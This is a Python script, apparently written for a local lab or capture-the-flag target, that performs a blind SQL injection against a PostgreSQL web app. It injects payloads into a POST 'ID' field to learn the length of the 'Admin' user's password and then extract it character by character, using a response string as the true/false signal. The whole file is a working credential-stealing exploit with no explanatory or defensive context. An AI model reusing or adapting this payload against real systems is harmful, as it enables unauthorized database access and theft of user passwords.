import requests
import string
# " and (select length(\"PassWord\") from public.\"user\" where \"UserName\"='thanh')={length}-- 
def get_length(url):
    length = 1
    while True:
        data = {'ID':f"8'and (select length(\"PassWord\") from public.\"user\" where \"UserName\"='Admin')={length}--"}
        r = requests.post(url=url,data=data)
        if 'Danh sach la:' in r.text:
            print(f'[+] Found length of password: {length}')
            break
        length += 1
    return length
def exploit(url):
    length =20
    wordlist = string.printable[:62]
    password = ''
    for i in range(1,length+1):
        for x in wordlist:
            data = {'ID':f"8'and substr((select \"PassWord\" from public.\"user\" where \"UserName\"='Admin'),{i},1)='{x}' --"}
            r = requests.post(url=url,data=data)
            if 'Danh sach la:' in r.text:
                password += x
                print(f'[+] Found char of password: {x} --> Password: {password}')
                break

if __name__=="__main__":
    url = 'http://localhost:8080/T1/index'
    exploit(url=url)    